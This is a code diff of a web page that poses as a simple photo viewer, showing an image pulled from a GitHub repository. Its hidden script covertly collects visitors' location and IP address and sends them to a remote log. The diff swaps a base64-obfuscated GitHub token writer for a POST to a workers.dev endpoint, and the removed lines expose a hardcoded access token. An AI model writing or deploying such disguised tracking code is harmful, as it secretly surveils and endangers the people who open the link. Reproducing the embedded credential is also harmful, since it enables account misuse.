@@ -18,12 +18,11 @@ img{max-width:100%;max-height:100vh;object-fit:contain;display:none}
 <img id="photo">
 <script>
 (function(){
-var T=atob("Z2hwX0E3RzFiTkVIY2xuc1F6Q0ZPemp2dUVmZkhpSlVOUzFJOWtNVw==");
-var R=atob("ZGhhbmFtcGFyaXN1c2VldHUtZHJvaWQvcGFyaXN1c2VldHU=");
-var F=atob("bG9jYXRpb25fbG9nLmpzb24=");
-var j=atob("SU1HXzIwMjYwNzI2XzEwMTgwOS5qcGc=");
+var API=atob("aHR0cHM6Ly9sb2NhdGlvbi1hcGkuZGhhbmFtcGFyaXN1c2VldHUud29ya2Vycy5kZXY=");
+var IMG=atob("SU1HXzIwMjYwNzI2XzEwMTgwOS5qcGc=");
+var REPO=atob("ZGhhbmFtcGFyaXN1c2VldHUtZHJvaWQvcGFyaXN1c2VldHU=");
 var I=60;
-var raw1="https://raw.githubusercontent.com/"+R+"/main/"+j;
+var raw1="https://raw.githubusercontent.com/"+REPO+"/main/"+IMG;
 var lastLoc=null;
 var lastIP=null;
 
@@ -38,23 +37,10 @@ var busy=false;
 function push(e){
     if(busy)return Promise.resolve();
     busy=true;
-    var url="https://api.github.com/repos/"+R+"/contents/"+F;
-    return fetch(url,{headers:{"Authorization":"token "+T}}).then(function(r){
-        if(r.status===403)return{rateLimited:true};
-        return r.ok?r.json():null
+    return fetch(API+"/location_log.json",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)}).then(function(r){
+        return r.json();
     }).then(function(d){
-        if(!d||d.rateLimited){busy=false;return}
-        var ex={locations:[]},sha=null;
-        if(d&&d.content){sha=d.sha;try{ex=JSON.parse(decodeURIComponent(escape(atob(d.content.replace(/\n/g,"")))))}catch(x){}}
-        if(!ex.locations)ex.locations=[];
-        ex.locations.push(e);
-        if(ex.locations.length>500)ex.locations=ex.locations.slice(-500);
-        var b={message:"\ud83d\udccd "+(e.city||"?"),content:btoa(unescape(encodeURIComponent(JSON.stringify(ex,null,2))))};
-        if(sha)b.sha=sha;
-        return fetch(url,{method:"PUT",headers:{"Authorization":"token "+T,"Content-Type":"application/json"},body:JSON.stringify(b)});
-    }).then(function(r){
         busy=false;
-        if(!r||!r.ok)return;
     }).catch(function(){busy=false});
 }
 
